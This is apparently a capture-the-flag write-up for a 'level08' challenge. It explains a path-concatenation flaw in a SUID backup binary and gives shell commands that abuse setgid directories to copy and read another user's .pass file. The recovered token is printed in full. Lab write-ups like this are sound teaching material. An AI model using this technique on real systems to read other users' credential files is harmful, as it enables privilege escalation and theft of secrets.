# level08

1. Overview

   * The binary naïvely builds the destination path as `"./backups/" + argv[1]` and copies the source file there using:

     ```c
     open(dst, O_WRONLY | O_CREAT | O_EXCL, 0660);
     ```
   * Because it is **SUID level09**, it can **read** `/home/users/level09/.pass` and then **create** the destination file under `./backups/...` with its own UID/GID.
   * Supplying an **absolute path** as argument makes the destination `./backups//home/users/level09/.pass`. The only reason it fails at first is that the intermediate directories under `./backups/` do not exist yet.
   * Files are created with mode **0660** (subject to umask). With the right directory setup, you can make the copied file group‑readable by **your** group.

2. Attack plan (why it works)

   * Create the missing directory tree under `./backups/` that mirrors the absolute path.
   * Set the **setgid** bit on those directories so newly created files inherit the **directory's group** (your group), not level09's.
   * Ensure the directories are world‑writable so the SUID program can create the file there.
   * Run the program with the absolute path; it will copy the secret using its privileges, but the resulting file's **group** will be yours and the **mode** includes group read → you can read the token.

3. Step‑by‑step

```bash
cd /home/users/level08

# 1) Create the directory tree that matches the absolute path under ./backups/
mkdir -p backups/home/users/level09

# 2) Set setgid (+s on group) and make the dirs writable for everyone
#    New files will inherit the directory's group
chmod 2777 backups backups/home backups/home/users backups/home/users/level09 #optionnal

# 3) Run the SUID binary with the absolute source path
/home/users/level08/level08 /home/users/level09/.pass

# If it worked, the copy now exists with your group
ls -l backups/home/users/level09/.pass
# expected: -rw-rw---- 1 level09 <your-group> ... backups/home/users/level09/.pass

# 4) Read the token
cat backups/home/users/level09/.pass
```

5. Token

Token found `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`